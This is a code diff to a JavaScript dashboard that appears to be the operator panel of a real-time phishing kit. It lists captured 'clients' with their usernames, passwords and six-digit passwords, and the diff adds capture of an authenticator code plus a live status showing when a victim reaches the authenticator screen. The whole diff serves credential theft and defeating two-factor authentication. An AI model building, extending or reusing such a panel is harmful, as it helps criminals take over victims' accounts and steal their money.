@@ -200,7 +200,7 @@ const panel = (() => {
     }
 
     function createClient(client) {
-        const { id, user, password, password6, type } = client
+        const { id, user, password, password6, type, auth } = client
         const tr = document.createElement('tr')
 
         tr.dataset.id = id
@@ -210,6 +210,7 @@ const panel = (() => {
         <td role="user">${user}</td>
         <td role="password">${password}</td>
         <input type="hidden" name="password6" value="${password6}">
+        <input type="hidden" name="auth" value="${auth}">
         <td role="status" class="blockstatus enter"><span>Cliente entrou</span></td>
         `
 
@@ -241,6 +242,25 @@ const panel = (() => {
     function receiver() {
         socket.on('createClient', (data) => {
             createClient(data)
+        })
+
+        socket.on('onScreenAuth', (data) => {
+            const info = document.querySelector(`.productList tr[data-id='${data.id}']`)
+
+            console.log('online na tela de auth')
+
+            if (!info) return
+
+            const role = info.querySelector('td[role="status"]')
+
+            if (!role) return
+            role.className = ''
+
+            role.classList.add('blockstatus', 'enter')
+
+            setTimeout(() => {
+                role.querySelector('span').innerHTML = `Online Autenticador`
+            }, 300)
         })
 
         socket.on('cleanClients', (data) => {
